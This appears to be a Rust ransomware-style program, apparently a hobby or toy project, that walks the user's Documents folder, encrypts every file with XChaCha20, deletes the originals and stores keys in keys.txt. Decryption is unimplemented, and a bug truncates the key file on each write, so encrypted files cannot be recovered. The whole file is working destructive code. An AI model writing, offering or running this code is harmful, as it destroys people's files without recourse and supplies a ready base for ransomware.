use std::io::Write;
use std::{fs, path::Path};
use std::path::PathBuf;
use orion::aead;
use dirs::document_dir;
use walkdir::WalkDir;
use text_io::read;

const ENCRYPTED_EXTENSION:	&str	= ".🔒";
const KEY_FILE_NAME:		&str	= "keys.txt";

type CipherAndKey	= (Vec<u8>, aead::SecretKey);
type IDFC<T>		= Result<T, Box<dyn std::error::Error>>;

fn main() -> IDFC<()> {
	let target_dir = document_dir().unwrap();
	let mut keyfile_loc = target_dir.clone();
	keyfile_loc.push(KEY_FILE_NAME);
	let keyfile_loc = keyfile_loc; // make immutable

	let mode_choice: String = read!();
	let first_char = mode_choice.chars().next();
	let encrypt_mode =
		if first_char.is_none() { false } else {
			first_char.unwrap().to_lowercase().to_string() == "y"
		};
	
	let keys = if encrypt_mode {
		None
	} else {
		Some(read_keyfile()?)
	};

	// encrypt shit :P
	let entries = WalkDir::new(target_dir);
	for entry in entries {
		let entry = entry?;
		let path = entry.path();

		if path.is_file() {
			if encrypt_mode {
				encrypt_file(path, keyfile_loc.as_path())?;
			} else {
				decrypt_file(path, keyfile_loc.as_path())?;
			}
		}
	}

	Ok(())
}

fn encrypt_file(path: &Path, keyfile_loc: &Path) -> IDFC<()> {
	let file_name = path.file_name().unwrap().to_string_lossy();

	// Don't encrypt keyfile or already encrypted files
	if	file_name.ends_with(ENCRYPTED_EXTENSION) &&
		path.canonicalize()? == keyfile_loc.canonicalize()? {
		
		return Ok(())
	}

	let encrypted_path = PathBuf::from(
		format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
	);

	// Prepare new file data
	let content = fs::read(&path)?;
	let (ciphertext, key) = encrypt_xchacha20(&content[..])?;

	// Write encrypted data to new file
	fs::write(&encrypted_path, &ciphertext[..])?;

	// Add key to keyfile, and rm old file
	append_file(keyfile_loc, key.unprotected_as_bytes())?;
	fs::remove_file(&path)?;

	Ok(())
}

fn decrypt_file(path: &Path, keyfile_loc: &Path) -> IDFC<()> {
	todo!()
}

fn encrypt_xchacha20(src: &[u8]) -> IDFC<CipherAndKey> {
	let secret_key = aead::SecretKey::default();
	let ciphertext = aead::seal(&secret_key, src)?;
	//let decrypted_data = aead::open(&secret_key, &ciphertext)?;

	Ok(
		(ciphertext, secret_key)
	)
}

fn append_file<F: AsRef<Path>>(path: F, data: &[u8]) -> IDFC<()> {
	fs::write(&path, &[])?;

	let mut file = fs::OpenOptions::new()
		.append(true)
		.create(true)
		.open(&path)?;

	file.write(data)?;

	Ok(())
}

fn read_keyfile() -> IDFC<aead::SecretKey> {
	todo!()
}
